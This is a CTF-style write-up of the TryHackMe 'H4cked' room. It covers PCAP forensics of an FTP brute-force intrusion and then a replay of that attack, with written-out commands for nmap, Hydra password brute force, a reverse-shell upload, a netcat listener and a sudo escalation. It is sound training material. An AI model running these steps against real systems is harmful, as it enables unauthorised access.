# Day 134 — TryHackMe: H4cked

**Date:** 2026-05-14
**Platform:** TryHackMe
**Room:** [H4cked](https://tryhackme.com/room/h4cked)
**Difficulty:** Easy
**Category:** Network Forensics / Incident Response / Pentesting
**Estimated Duration:** ~90 minutes

---

## Description

Two-part room: first we analyze an attack from a PCAP file as blue
team analysts, then we replicate the attacker's steps as red team to
recover access to the compromised machine.

---

## Task 1 — PCAP Forensic Analysis

### Main Tool
Wireshark — network traffic analysis from a capture taken during the attack.

### What I Found

The attacker targeted the victim's **FTP service (port 21)**.
Using **Hydra**, a brute force attack was launched against the user
`jenny` until the password `password123` was discovered.

Once authenticated, the attacker navigated to `/var/www/html` and
uploaded a **PHP reverse shell** (`shell.php`) sourced from
`pentestmonkey.net`.

With system access, the attacker executed:

```bash
whoami                                           # user reconnaissance
python3 -c 'import pty; pty.spawn("/bin/bash")'  # stable TTY shell
sudo su                                          # privilege escalation to root
```

Finally, the attacker downloaded and installed **Reptile** from
GitHub — a **kernel-mode rootkit** designed for detection evasion
and system persistence.

### Identified IOCs

| Indicator | Type | Detail |
|---|---|---|
| Attacker IP | IP Address | Visible in FTP traffic within the PCAP |
| jenny | Username | Brute force target |
| password123 | Credential | Compromised password |
| shell.php | File | PHP reverse shell uploaded via FTP |
| Reptile | Malware | Rootkit installed for persistence |

### Attack Flow (Kill Chain)
Reconnaissance → FTP Brute Force → Initial Access →
Backdoor Upload → Reverse Shell → Privilege Escalation →
Rootkit Installation (Persistence)

---

## Task 2 — Replicating the Attack

### Objective
Replicate the attacker's methodology to recover access and read
`flag.txt` inside `/root/Reptile`.

### Steps Executed

**1. Nmap scan — service discovery**
```bash
nmap -A -T4 -Pn -p- <machine-ip>
```
Confirmed FTP running on port 21.

**2. Brute force with Hydra**
```bash
hydra -l jenny -P /usr/share/wordlists/rockyou.txt <machine-ip> ftp
```
Password recovered: `password123`

**3. FTP login + backdoor upload**
```bash
ftp <machine-ip>
# Logged in as jenny
put shell.php
```
Modified `shell.php` with local tun0 IP and listener port before uploading.

**4. Netcat listener**
```bash
nc -lvnp 4444
```

**5. TTY shell stabilization**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**6. Privilege escalation**
```bash
sudo -l     # confirmed full sudo permissions
sudo su     # root access obtained
```

**7. Flag captured**
cat /root/Reptile/flag.txt

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|---|---|---|
| Brute Force | T1110 | Hydra used to crack FTP credentials |
| Ingress Tool Transfer | T1105 | PHP reverse shell uploaded via FTP |
| Command and Scripting Interpreter | T1059 | Bash shell spawned post-exploitation |
| Abuse Elevation Control Mechanism | T1548 | `sudo su` used to escalate to root |
| Rootkit | T1014 | Reptile installed for kernel-level persistence |

---

## Key Learnings

- Weak FTP credentials are trivial to crack with wordlist attacks —
  `password123` was found in seconds with rockyou.txt
- PHP reverse shells uploaded via FTP give immediate interactive
  access if the web server executes PHP
- Kernel rootkits like Reptile are extremely difficult to detect
  post-installation — prevention is critical
- Always check `sudo -l` after initial access; misconfigured sudo
  permissions are one of the most common privilege escalation vectors

---

## Tools Used

| Tool | Purpose |
|---|---|
| Wireshark | PCAP analysis and traffic inspection |
| Nmap | Port scanning and service enumeration |
| Hydra | FTP brute force |
| Netcat | Reverse shell listener |
| PentestMonkey PHP shell | Backdoor payload |

---

